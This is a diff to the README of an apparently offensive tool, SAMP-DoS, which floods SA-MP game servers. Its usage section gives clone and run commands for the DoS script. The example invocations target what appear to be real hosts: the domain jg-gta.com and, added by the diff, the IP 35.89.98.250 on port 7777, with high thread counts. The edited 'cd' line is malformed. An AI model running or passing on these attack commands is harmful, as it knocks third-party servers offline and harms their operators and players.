@@ -2,8 +2,8 @@
 ### How to use?
 ```
 > git clone https://github.com/B369-XD/SAMP-DoS
-> cd SAMP-DoS
-> Ex : python3 SAMP-DoS.py -i (IP) -p (PORT) -t (TIMES (DEFAULT 1000)) -th (THREADS (DEFAULT 450))
+> cd SAMP-DoS 35.89.98.250:7777
+> Ex : python3 SAMP-DoS.py -i (IP) -p (7777) -t (TIMES (DEFAULT 1000)) -th (THREADS (DEFAULT 450))
 > Ex : python3 SAMP-DoS.py -i jg-gta.com -p 7777 -t 1500 -th 1000
 > Ex : python3 SAMP-DoS.py -i jg-gta.com -p 7777
 ```
